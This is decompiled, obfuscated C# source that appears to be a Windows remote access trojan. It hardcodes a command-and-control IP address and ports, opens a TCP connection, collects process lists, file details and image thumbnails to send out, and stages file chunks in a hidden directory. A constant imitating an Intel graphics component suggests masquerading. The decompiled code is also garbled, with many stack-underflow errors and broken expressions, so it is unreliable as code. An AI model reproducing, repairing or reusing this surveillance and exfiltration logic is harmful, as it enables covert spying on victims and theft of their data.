#define TRACE
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Transactions;
using System.Windows.Forms;
using System.Xml;
using _0001;
using _0002;
using _0003;
using _0004;
using _0005;
using _0006;
using _0007;
using _0008;
using _000E;
using _000F;
using _0010;
using _0011;
using _0012;
using _0013;
using _0014;
using _0015;
using _0016;
using _0017;
using _0018;
using _0019;
using _001A;
using _001B;
using _001C;
using _001D;
using _001E;
using _001F;
using Microsoft.Win32;
using NAudio;
using NAudio.MediaFoundation;
using NAudio.Midi;
using NAudio.Mixer;
using NAudio.SoundFont;
using NAudio.Wave;
using NAudio.Wave.Asio;
using _007F;
using _0080;

namespace _0010
{
	internal sealed class _0001
	{
		public sealed class _0001
		{
			internal static global::_000E._0005 _0001;

			static _0001()
			{
				//IL_00bb: Incompatible stack heights: 0 vs 1
				bool flag = false;
				global::_0001._0001();
				Assembly assembly;
				if (true)
				{
					assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
				}
				Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
				if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
				{
					return;
				}
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
		}

		static _0001()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _007F
{
	internal sealed class _0001
	{
	}
}
namespace _0001
{
	internal sealed class _0002 : Form
	{
		private global::_0008._0001 m__0001 = new global::_0008._0001();

		private IContainer m__0001 = null;

		public _0002()
		{
			global::_0011._0018._0001(this);
		}

		internal void _0001(object _0002, EventArgs _0003)
		{
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 2
			//IL_005b: Incompatible stack heights: 0 vs 2
			try
			{
				_ = ((_0002)/*Error near IL_0009: Stack underflow*/).m__0001;
				((global::_0008._0001)/*Error near IL_0010: Stack underflow*/)._0001 = (_0002)/*Error near IL_0010: Stack underflow*/;
				_ = global::_0005._0083;
				/*Error near IL_001d: Stack underflow*/((object)/*Error near IL_001d: Stack underflow*/, false);
				global::_0005._0084(this, false);
				global::_0005._0086(this, false);
				global::_0006._0095(this, (FormBorderStyle)6);
				global::_0011._0018._0001(this.m__0001);
			}
			catch
			{
			}
		}

		internal void _0001(object _0002, FormClosingEventArgs _0003)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0007._0096(10);
				global::_0011._0018._0001(((_0002)/*Error near IL_0013: Stack underflow*/).m__0001);
			}
			catch
			{
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0005: Stack underflow*/ != 0 && ((_0002)/*Error near IL_000c: Stack underflow*/).m__0001 != null)
			{
				global::_0008._007E_0098(this.m__0001);
			}
			global::_0005._0087(this, _0002);
		}

		static _0002()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0004
{
	internal sealed class _0001
	{
		public global::_0008._0001 _0001;

		public DateTime _0001;

		public string _0001(string _0002, bool _0003 = false)
		{
			//IL_017f: Incompatible stack heights: 0 vs 1
			//IL_0189: Incompatible stack heights: 0 vs 1
			try
			{
				new FileInfo((string)/*Error near IL_0189: Stack underflow*/);
				FileInfo fileInfo = default(FileInfo);
				if (0 == 0)
				{
					fileInfo = (FileInfo)/*Error near IL_018f: Stack underflow*/;
				}
				string text = global::_0002._007E_0005(fileInfo) + ((!_0003) ? global::_0002._007E_0006(global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0]) : global::_000E._008A_0002(_0080._0014._0001(107396701), new char[1] { '|' })[0]);
				text = text + global::_0010._007E_008D_0002(fileInfo).ToString() + ((!_0003) ? global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0] : global::_000E._008A_0002(_0080._0014._0001(107396701), new char[1] { '|' })[0]);
				text = text + _0001(global::_0012._007E_008F_0002(fileInfo)) + ((!_0003) ? global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0] : global::_000E._008A_0002(_0080._0014._0001(107396701), new char[1] { '|' })[0]);
				if (!_0003)
				{
					global::_0011._0018._0001(this._0001, (byte[])null, global::_000F._008B_0002(global::_000E._008A_0002(_0080._0014._0001(107396667), new char[1] { '|' })[0], text), false);
				}
				return text;
			}
			catch
			{
				return _0080._0014._0001(107396634);
			}
		}

		public string _0001(long _0002)
		{
			//IL_017b: Incompatible stack heights: 0 vs 5
			//IL_0185: Incompatible stack heights: 0 vs 1
			//IL_018f: Incompatible stack heights: 0 vs 4
			try
			{
				_ = new string[7];
				_ = 0;
				_ = global::_000E._008A_0002;
				_0080._0014._0001(107396633);
				char[] obj = new char[1] { '!' };
				/*Error near IL_0185: Stack underflow*/((object)/*Error near IL_0185: Stack underflow*/, obj);
				object obj2 = ((object[])/*Error near IL_002b: Stack underflow*/)[0];
				((object[])/*Error near IL_002c: Stack underflow*/)[/*Error near IL_002c: Stack underflow*/] = obj2;
				/*Error near IL_002c: Stack underflow*/;
				_ = 1;
				_ = global::_000E._008A_0002;
				_0080._0014._0001(107397096);
				char[] obj3 = new char[1] { '!' };
				string obj4 = /*Error near IL_004d: Stack underflow*/((object)/*Error near IL_004d: Stack underflow*/, obj3)[0];
				((object[])/*Error near IL_0050: Stack underflow*/)[/*Error near IL_0050: Stack underflow*/] = obj4;
				((object[])/*Error near IL_0050: Stack underflow*/)[2] = global::_000E._008A_0002(_0080._0014._0001(107397111), new char[1] { '!' })[0];
				((object[])/*Error near IL_0074: Stack underflow*/)[3] = _0080._0014._0001(107397062);
				((object[])/*Error near IL_0081: Stack underflow*/)[4] = _0080._0014._0001(107397057);
				((object[])/*Error near IL_008e: Stack underflow*/)[5] = _0080._0014._0001(107397084);
				((object[])/*Error near IL_009b: Stack underflow*/)[6] = global::_000E._008A_0002(_0080._0014._0001(107397079), new char[1] { '!' })[0];
				string[] array = (string[])/*Error near IL_00c0: Stack underflow*/;
				if (_0002 == 0)
				{
					return global::_000F._008B_0002(_0080._0014._0001(107397030), global::_0002._007E_0006(array[0]));
				}
				long num = global::_0013._0093_0002(_0002);
				int num2 = global::_0016._0004_0003(global::_0015._0098_0002(global::_0014._0094_0002(num, 1024.0)));
				double num3 = global::_0017._0005_0003((double)num / global::_0014._0095_0002(1024.0, num2), 1);
				double num4 = (double)global::_0018._0006_0003(_0002) * num3;
				return global::_000F._008B_0002(num4.ToString(), array[num2]);
			}
			catch
			{
				return _0080._0014._0001(107396634);
			}
		}

		public _0001(global::_0008._0001 _0015_0013)
		{
			this._0001 = _0015_0013;
		}
	}
}
namespace _0008
{
	internal sealed class _0001
	{
		private delegate void _0001(global::_0001._0002 form);

		[CompilerGenerated]
		internal sealed class _0002
		{
			public string[] _0001;

			public _0003 _0001;

			internal void _0001()
			{
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				global::_0008._0001 obj = ((_0002)/*Error near IL_0008: Stack underflow*/)._0001._0001;
				string text = ((_0002)/*Error near IL_0016: Stack underflow*/)._0001[1];
				global::_0011._0018._0001(text, obj);
			}

			internal void _0002()
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_0030: Incompatible stack heights: 0 vs 1
				_0016._0001 obj = ((_0002)/*Error near IL_0008: Stack underflow*/)._0001._0001._0001;
				_0016._0001 obj2 = default(_0016._0001);
				if (0 == 0)
				{
					obj2 = obj;
				}
				string text = ((_0002)/*Error near IL_001d: Stack underflow*/)._0001[1];
				global::_0011._0018._0001(text, obj2);
			}

			internal void _0003()
			{
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				global::_0008._0001 obj = ((_0002)/*Error near IL_0008: Stack underflow*/)._0001._0001;
				string text = ((_0002)/*Error near IL_0016: Stack underflow*/)._0001[1];
				global::_0011._0018._0001(text, obj);
			}

			internal void _0004()
			{
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				global::_0008._0001 obj = ((_0002)/*Error near IL_0008: Stack underflow*/)._0001._0001;
				string text = ((_0002)/*Error near IL_0016: Stack underflow*/)._0001[1];
				global::_0011._0018._0001(text, obj);
			}

			internal void _0005()
			{
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				global::_0008._0001 obj = ((_0002)/*Error near IL_0008: Stack underflow*/)._0001._0001;
				string text = ((_0002)/*Error near IL_0016: Stack underflow*/)._0001[1];
				global::_0011._0018._0001(text, obj);
			}
		}

		[CompilerGenerated]
		internal sealed class _0003
		{
			public string _0001;

			public string _0002;

			public int _0001;

			public global::_0008._0001 _0001;

			public ThreadStart _0001;

			public ThreadStart _0002;

			public ThreadStart _0003;

			public ThreadStart _0004;

			internal void _0001()
			{
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 2
				//IL_0024: Incompatible stack heights: 0 vs 2
				_ = ((_0003)/*Error near IL_0008: Stack underflow*/)._0001;
				_ = ((_0003)/*Error near IL_000f: Stack underflow*/)._0002;
				int num = ((_0003)/*Error near IL_0016: Stack underflow*/)._0001;
				((global::_0008._0001)/*Error near IL_001b: Stack underflow*/)._0001((string)/*Error near IL_001b: Stack underflow*/, num);
			}

			internal void _0002()
			{
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 2
				_ = ((_0003)/*Error near IL_0008: Stack underflow*/)._0001;
				string text = ((_0003)/*Error near IL_000f: Stack underflow*/)._0001;
				((global::_0008._0001)/*Error near IL_001e: Stack underflow*/)._0001(text);
			}

			internal void _0003()
			{
				//IL_001e: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 3
				//IL_0028: Incompatible stack heights: 0 vs 1
				_ = ((_0003)/*Error near IL_0008: Stack underflow*/)._0001;
				_ = global::_0002._007E_0006;
				string text = ((_0003)/*Error near IL_0014: Stack underflow*/)._0001;
				/*Error near IL_0028: Stack underflow*/(text);
				global::_0011._0018._0001((global::_0008._0001)/*Error near IL_001b: Stack underflow*/, (string)/*Error near IL_001b: Stack underflow*/);
			}

			internal void _0004()
			{
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 2
				_ = ((_0003)/*Error near IL_0008: Stack underflow*/)._0001;
				string text = ((_0003)/*Error near IL_000f: Stack underflow*/)._0001;
				((global::_0008._0001)/*Error near IL_001e: Stack underflow*/)._0001(text);
			}
		}

		[CompilerGenerated]
		internal sealed class _0004
		{
			public string _0001;

			public _0002 _0001;

			internal void _0001()
			{
				//IL_004e: Incompatible stack heights: 0 vs 1
				//IL_0055: Incompatible stack heights: 0 vs 4
				//IL_0058: Incompatible stack heights: 0 vs 1
				_ = ((_0004)/*Error near IL_0008: Stack underflow*/)._0001._0001._0001;
				_ = null;
				_ = _0084._000F_0004;
				_0080._0014._0001(107397018);
				string text = ((_0004)/*Error near IL_0026: Stack underflow*/)._0001._0001._0001;
				string text2 = _0080._0014._0001(107396973);
				string text3 = this._0001;
				string text4 = /*Error near IL_0045: Stack underflow*/((string)/*Error near IL_0045: Stack underflow*/, text, text2, text3);
				global::_0011._0018._0001((global::_0008._0001)/*Error near IL_004b: Stack underflow*/, (byte[])/*Error near IL_004b: Stack underflow*/, text4, false);
			}
		}

		[CompilerGenerated]
		internal sealed class _0005
		{
			public string _0001;

			public _0002 _0001;

			internal void _0001()
			{
				//IL_004e: Incompatible stack heights: 0 vs 1
				//IL_0055: Incompatible stack heights: 0 vs 4
				//IL_0058: Incompatible stack heights: 0 vs 1
				_ = ((_0005)/*Error near IL_0008: Stack underflow*/)._0001._0001._0001;
				_ = null;
				_ = _0084._000F_0004;
				_0080._0014._0001(107397018);
				string text = ((_0005)/*Error near IL_0026: Stack underflow*/)._0001._0001._0001;
				string text2 = _0080._0014._0001(107396973);
				string text3 = this._0001;
				string text4 = /*Error near IL_0045: Stack underflow*/((string)/*Error near IL_0045: Stack underflow*/, text, text2, text3);
				global::_0011._0018._0001((global::_0008._0001)/*Error near IL_004b: Stack underflow*/, (byte[])/*Error near IL_004b: Stack underflow*/, text4, false);
			}
		}

		public ProcessStartInfo _0001;

		internal bool _0001 = false;

		internal bool _0002 = false;

		internal bool _0003 = false;

		public int _0001 = 0;

		internal bool _0004 = false;

		internal int _0002 = 0;

		public Process _0001;

		private Dictionary<string, byte[]> m__0001 = new Dictionary<string, byte[]>();

		private bool m__0005 = false;

		internal _0016._0001 _0001 = new _0016._0001();

		internal int _0003 = 1024;

		public global::_0004._0001 _0001;

		public global::_0001._0002 _0001;

		public bool _0006 = false;

		internal global::_000F._0001 _0001 = new global::_000F._0001();

		internal Thread _0001;

		public TcpClient _0001;

		public NetworkStream _0001;

		public bool _0007 = false;

		public bool _0008 = false;

		internal ThreadStart _0001;

		internal int _0004 = 210;

		internal bool _000E = false;

		internal MemoryStream _0001 = new MemoryStream();

		internal global::_0002._0001 _0001 = new global::_0002._0001();

		internal Bitmap _0001;

		public void _0001(string _0002)
		{
			//IL_015c: Incompatible stack heights: 0 vs 2
			//IL_0166: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_0002._007E_0006;
				_0080._0014._0001(107396634);
				/*Error near IL_0166: Stack underflow*/((object)/*Error near IL_0166: Stack underflow*/);
				string text = (string)/*Error near IL_016c: Stack underflow*/;
				Process[] array = global::_0019._0008_0003();
				for (int i = 0; i <= array.Length - 1; i++)
				{
					text = global::_0011._008E_0002(text, global::_001A._007E_000E_0003(array[i]).ToString(), global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0]);
					text = global::_0011._008E_0002(text, global::_0002._007E_0006(global::_0002._007E_0007(array[i])), global::_000E._008A_0002(_0080._0014._0001(107397025), new char[1] { '!' })[0]);
					text = global::_000F._008B_0002(text, global::_000E._008A_0002(_0080._0014._0001(107397040), new char[1] { '|' })[0]);
					text = global::_000F._008B_0002(text, global::_0002._007E_0006(_0080._0014._0001(107397023)));
				}
				byte[] array2 = global::_0011._0018._0001(text);
				global::_0011._0018._0001(this, array2, global::_0011._008E_0002(_0080._0014._0001(107397018), _0002, global::_0002._007E_0006(_0080._0014._0001(107396973))), false);
			}
			catch
			{
			}
		}

		internal void _0001(object _0002)
		{
			//IL_00f9: Incompatible stack heights: 0 vs 1
			//IL_0105: Incompatible stack heights: 0 vs 1
			try
			{
				bool flag = !((global::_0008._0001)/*Error near IL_000c: Stack underflow*/).m__0005;
				if ((int)/*Error near IL_001e: Stack underflow*/ != 0)
				{
					this.m__0005 = true;
					global::_0011._0018._0001(this._0001);
					if (!_0007 || !global::_001B._007E_0082_0003(this._0001))
					{
						if (!global::_001C._0095_0003(global::_0011._0018._0001()))
						{
							global::_001D._0098_0003(global::_0011._0018._0001());
						}
						_0007 = global::_0011._0018._0001(this);
						if (_0007)
						{
							this._0003 = global::_001A._007E_000F_0003(this._0001);
							if (global::_001C._0095_0003(global::_000F._008B_0002(global::_0011._0018._0001(), global::_0002._007E_0006(global::_0015._0001._000F))))
							{
								this._0004 = true;
							}
							global::_0011._0018._0001(this);
						}
					}
				}
				this.m__0005 = false;
			}
			catch
			{
				this._0002++;
				_0007 = false;
				this._0002 = false;
				this.m__0005 = false;
				this._0003 = false;
			}
		}

		public void _0001(string _0002, int _0003)
		{
			//IL_01ea: Incompatible stack heights: 0 vs 1
			//IL_01f6: Incompatible stack heights: 0 vs 1
			try
			{
				new List<string>();
				List<string> list = (List<string>)/*Error near IL_01f0: Stack underflow*/;
				FileStream fileStream = new FileStream((string)/*Error near IL_0018: Stack underflow*/, FileMode.Open, FileAccess.Read);
				int num = (int)global::_0015._0099_0002((double)global::_0012._007E_0090_0002(fileStream) / (double)_0003);
				string text = global::_000F._008B_0002(global::_001E._0099_0003(_0002), _0080._0014._0001(107396968));
				if (!global::_001C._0095_0003(text))
				{
					DirectoryInfo directoryInfo = global::_001D._0098_0003(text);
					global::_001F._007E_0002_0004(directoryInfo, FileAttributes.Hidden | FileAttributes.Directory);
				}
				string text2 = global::_0002._007E_0006(global::_001E._009A_0003(_0002));
				string text3 = global::_001E._009B_0003(_0002);
				for (int i = 0; i < _0003; i++)
				{
					FileStream fileStream2 = new FileStream(_0081._0005_0004(new string[7]
					{
						text,
						_0080._0014._0001(107396991),
						text2,
						_0080._0014._0001(107396986),
						global::_0080._007E_0004_0004(i.ToString(), 5, global::_007F._0003_0004(_0080._0014._0001(107397030))),
						text3,
						_0080._0014._0001(107396981)
					}), FileMode.Create, FileAccess.Write);
					byte[] array = new byte[num];
					int num2;
					if ((num2 = _0082._007E_0006_0004(fileStream, array, 0, num)) > 0)
					{
						_0083._007E_0008_0004(fileStream2, array, 0, num2);
						string item = _0084._000F_0004(text2, _0080._0014._0001(107396986), global::_0080._007E_0004_0004(i.ToString(), 3, global::_007F._0003_0004(_0080._0014._0001(107397030))), global::_0002._007E_0006(text3));
						list.Add(item);
					}
					global::_0008._007E_0099(fileStream2);
				}
				global::_0008._007E_0099(fileStream);
			}
			catch
			{
			}
		}

		internal void _0002(string _0002)
		{
			//IL_011d: Incompatible stack heights: 0 vs 1
			//IL_0122: Unknown result type (might be due to invalid IL or missing references)
			//IL_0127: Incompatible stack heights: 0 vs 1
			//IL_012c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0131: Incompatible stack heights: 0 vs 1
			try
			{
				new Bitmap((string)/*Error near IL_0127: Stack underflow*/);
				new Bitmap((Image)/*Error near IL_0131: Stack underflow*/, 210, 160);
				Bitmap val = (Bitmap)/*Error near IL_001c: Stack underflow*/;
				if (val != null)
				{
					FileInfo fileInfo = new FileInfo(_0002);
					string text = global::_000F._008B_0002(global::_0002._007E_0005(fileInfo), global::_0002._007E_0006(_0080._0014._0001(107396940)));
					text = global::_0011._008E_0002(text, global::_0010._007E_008D_0002(fileInfo).ToString(), global::_0002._007E_0006(_0080._0014._0001(107396940)));
					text = global::_0011._008E_0002(text, this._0001._0001(global::_0012._007E_008F_0002(fileInfo)), global::_000E._008A_0002(_0080._0014._0001(107397025), new char[1] { '!' })[0]);
					MemoryStream memoryStream = new MemoryStream();
					_0087._007E_0012_0004(val, memoryStream, _0086._0010_0004());
					global::_0011._0018._0001(this, _0088._007E_0013_0004(memoryStream), global::_000F._008B_0002(_0080._0014._0001(107396935), text), false);
				}
			}
			catch
			{
			}
		}

		internal void _0001()
		{
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_004a: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001(((global::_0008._0001)/*Error near IL_0008: Stack underflow*/)._0001);
			string text = (string)/*Error near IL_004d: Stack underflow*/;
			global::_0011._0018._0001(this, (byte[])null, global::_000F._008B_0002(global::_000E._008A_0002(_0080._0014._0001(107396946), new char[1] { '!' })[0], text), false);
		}

		public void _0001(global::_0001._0002 _0002)
		{
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_0051: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_001B._007E_0083_0003;
				/*Error near IL_0051: Stack underflow*/((object)/*Error near IL_0051: Stack underflow*/);
				if (/*Error near IL_000d: Stack underflow*/)
				{
					_0001 obj = _0001;
					_0089._007E_0014_0004(_0002, obj, new object[1] { _0002 });
				}
				else
				{
					global::_0008._007E_009A(_0002);
				}
			}
			catch (Exception)
			{
			}
		}

		[CompilerGenerated]
		internal void _0002()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((global::_0008._0001)/*Error near IL_000f: Stack underflow*/);
		}

		[CompilerGenerated]
		internal void _0003()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((global::_0008._0001)/*Error near IL_000f: Stack underflow*/);
		}

		static _0001()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000F
{
	internal sealed class _0001
	{
		public bool _0001 = false;

		public bool _0002 = false;

		public Timer _0001;

		public int _0001 = 1;
	}
}
namespace _0016
{
	internal sealed class _0001
	{
		public List<string> _0001 = new List<string>();

		public List<string> _0002 = new List<string>();

		public int _0001 = 0;

		public List<string> _0003 = new List<string>();

		public bool _0001 = false;

		public global::_0008._0001 _0001;

		public int _0002 = 0;

		public _0001()
		{
			this._0001.Add(_0080._0014._0001(107396913).ToString());
			this._0001.Add(_0080._0014._0001(107396868).Split(new char[1] { '|' })[0]);
			this._0001.Add(_0080._0014._0001(107396327).Split(new char[1] { '|' })[0]);
			this._0001.Add(_0080._0014._0001(107396314).Split(new char[1] { '|' })[0]);
			this._0001.Add(_0080._0014._0001(107396257).Split(new char[1] { '|' })[0]);
			this._0001.Add(_0080._0014._0001(107396248).Split(new char[1] { '|' })[0]);
			this._0001.Add(_0080._0014._0001(107396219).Split(new char[1] { '|' })[0]);
			this._0001.Add(_0080._0014._0001(107396190).Split(new char[1] { '|' })[0]);
			this._0001.Add(_0080._0014._0001(107396129).Split(new char[1] { '|' })[0]);
			this._0001.Add(_0080._0014._0001(107396096).Split(new char[1] { '|' })[0]);
		}

		static _0001()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0080
{
	internal static class _0001
	{
		[STAThread]
		private static void _0001()
		{
			//IL_0033: Incompatible stack heights: 0 vs 2
			_008A._0015_0004();
			_008B._0017_0004(false);
			_ = _008C._0018_0004;
			new global::_0001._0002();
			/*Error near IL_001e: Stack underflow*/((Form)/*Error near IL_001e: Stack underflow*/);
		}
	}
}
namespace _0002
{
	internal sealed class _0001
	{
		internal struct _0001
		{
			public int _0001;

			public int _0002;

			public IntPtr _0001;

			public _0002 _0001;
		}

		internal struct _0002
		{
			public int _0001;

			public int _0002;
		}

		private const int m__0001 = 1;

		static _0001()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0015
{
	internal static class _0001
	{
		public const string _0001 = "igfxmgmt$gladat";

		public static string _0002;

		public static string _0003;

		public static string _0004;

		public static string _0005;

		public static string _0006;

		public static string _0007;

		public static string _0008;

		public static string _000E;

		public static string _000F;

		public static string _0010;

		public static byte[] _0001;

		public static int _0001;

		public static RegistryKey _0001;

		public static int[] _0001;

		public static string _0011;

		public static string _0012;

		public static string _0013;

		public static string _0014;

		public static string _0015;

		public static string _0016;

		public static string _0017;

		public static string _0018;

		public static string _0019;

		public static string _001A;

		public static string _001B;

		public static string _001C;

		public static string _001D;

		public static string _001E;

		public static string _0001()
		{
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 3
			try
			{
				_008D._0019_0004();
				OperatingSystem operatingSystem = (OperatingSystem)/*Error near IL_0065: Stack underflow*/;
				_ = global::_001A._007E_0010_0003;
				_ = _008E._007E_001A_0004;
				Version version = /*Error near IL_001c: Stack underflow*/((object)/*Error near IL_001c: Stack underflow*/);
				int num = /*Error near IL_0021: Stack underflow*/(version);
				return global::_0011._008E_0002(num.ToString(), _0080._0014._0001(107396940), global::_001A._007E_0011_0003(_008E._007E_001A_0004(operatingSystem)).ToString());
			}
			catch
			{
				return global::_000E._008A_0002(_0080._0014._0001(107396559), new char[1] { '!' })[0];
			}
		}

		static _0001()
		{
			//IL_0344: Incompatible stack heights: 0 vs 2
			//IL_034e: Incompatible stack heights: 0 vs 1
			//IL_0358: Incompatible stack heights: 0 vs 2
			_ = global::_000E._008A_0002;
			_0080._0014._0001(107396574);
			char[] obj = new char[1] { '|' };
			/*Error near IL_034e: Stack underflow*/((object)/*Error near IL_034e: Stack underflow*/, obj);
			_0002 = (string)((object[])/*Error near IL_0021: Stack underflow*/)[0];
			_ = global::_000E._008A_0002;
			_0080._0014._0001(107396521);
			char[] obj2 = new char[1] { '|' };
			_0003 = /*Error near IL_0045: Stack underflow*/((object)/*Error near IL_0045: Stack underflow*/, obj2)[0];
			_0004 = global::_000E._008A_0002(_0080._0014._0001(107396528), new char[1] { '|' })[0];
			_0005 = global::_000E._008A_0002(_0080._0014._0001(107396499), new char[1] { '|' })[0];
			_0006 = global::_000E._008A_0002(_0080._0014._0001(107396474), new char[1] { '|' })[0];
			_0007 = global::_000E._008A_0002(_0080._0014._0001(107396417), new char[1] { '|' })[0];
			_0008 = global::_0002._007E_0006(_008F._001C_0004());
			_000E = global::_000E._008A_0002(_0080._0014._0001(107396392), new char[1] { '|' })[0];
			_000F = global::_000E._008A_0002(_0080._0014._0001(107396367), new char[1] { '|' })[0];
			_0010 = global::_000E._008A_0002(_0080._0014._0001(107396378), new char[1] { '|' })[0];
			global::_0015._0001._0001 = new byte[14]
			{
				49, 56, 53, 46, 49, 52, 48, 46, 53, 51,
				46, 50, 52, 49
			};
			global::_0015._0001._0001 = 3388;
			global::_0015._0001._0001 = null;
			global::_0015._0001._0001 = new int[4] { 1290, 6711, 8934, 23856 };
			_0012 = _0080._0014._0001(107396634);
			_0013 = _0080._0014._0001(107396634);
			_0014 = _0080._0014._0001(107396634);
			_0015 = _0080._0014._0001(107396634);
			_0016 = global::_000E._008A_0002(_0080._0014._0001(107395813), new char[1] { '|' })[0];
			_0017 = global::_000E._008A_0002(_0080._0014._0001(107395788), new char[1] { '|' })[0];
			_0018 = global::_000E._008A_0002(_0080._0014._0001(107395755), new char[1] { '|' })[0];
			_0019 = global::_000E._008A_0002(_0080._0014._0001(107395762), new char[1] { '|' })[0];
			_001A = global::_000E._008A_0002(_0080._0014._0001(107395733), new char[1] { '|' })[0];
			_001B = global::_000E._008A_0002(_0080._0014._0001(107395708), new char[1] { '|' })[0];
			_001C = global::_000E._008A_0002(_0080._0014._0001(107395651), new char[1] { '|' })[0];
			_001D = global::_000E._008A_0002(_0080._0014._0001(107395638), new char[1] { '|' })[0];
